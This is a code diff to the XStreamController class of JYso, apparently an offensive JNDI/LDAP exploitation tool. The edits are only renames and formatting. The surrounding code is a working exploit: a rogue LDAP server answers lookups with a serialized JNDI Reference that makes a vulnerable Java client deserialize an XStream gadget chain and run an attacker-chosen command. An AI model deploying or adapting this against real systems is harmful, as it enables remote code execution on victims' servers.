@@ -5,7 +5,7 @@ import com.qi4l.JYso.exceptions.IncorrectParamsException;
 import com.qi4l.JYso.exceptions.UnSupportedActionTypeException;
 import com.qi4l.JYso.exceptions.UnSupportedGadgetTypeException;
 import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
-import com.qi4l.JYso.gadgets.utils.Util;
+import com.qi4l.JYso.gadgets.utils.Utils;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
@@ -16,9 +16,10 @@ import org.fusesource.jansi.Ansi;
 import javax.naming.StringRefAddr;
 
 @LdapMapping(uri = {"/xstream"})
-public class XStreamController implements LdapController{
+public class XStreamController implements LdapController {
     private PayloadType type;
-    private String[]    params;
+    private String[] params;
+
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         Entry e = new Entry(base);
@@ -60,12 +61,12 @@ public class XStreamController implements LdapController{
                 "        </probes>\n" +
                 "      </handler>\n" +
                 "    </dynamic-proxy>\n" +
-                "    <string>"+ params[0] +"</string>\n" +
+                "    <string>" + params[0] + "</string>\n" +
                 "  </java.util.PriorityQueue>\n" +
                 "</java.util.PriorityQueue>";
         ref.add(new StringRefAddr("forceString", "a=fromXML"));
         ref.add(new StringRefAddr("a", xml));
-        e.addAttribute("javaSerializedData", Util.serialize(ref));
+        e.addAttribute("javaSerializedData", Utils.serialize(ref));
         result.sendSearchEntry(e);
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
     }
@@ -74,7 +75,7 @@ public class XStreamController implements LdapController{
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException, UnSupportedGadgetTypeException, UnSupportedActionTypeException {
         System.out.println("- JNDI LDAP Local Refenrence Links + XStream");
         try {
-            int firstIndex  = base.indexOf("/");
+            int firstIndex = base.indexOf("/");
             int secondIndex = base.indexOf("/", firstIndex + 1);
             if (secondIndex < 0) secondIndex = base.length();
 
@@ -87,7 +88,7 @@ public class XStreamController implements LdapController{
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + payloadType);
             }
 
-            String cmd = Util.getCmdFromBase(base);
+            String cmd = Utils.getCmdFromBase(base);
             System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
             params = new String[]{cmd};
         } catch (Exception e) {
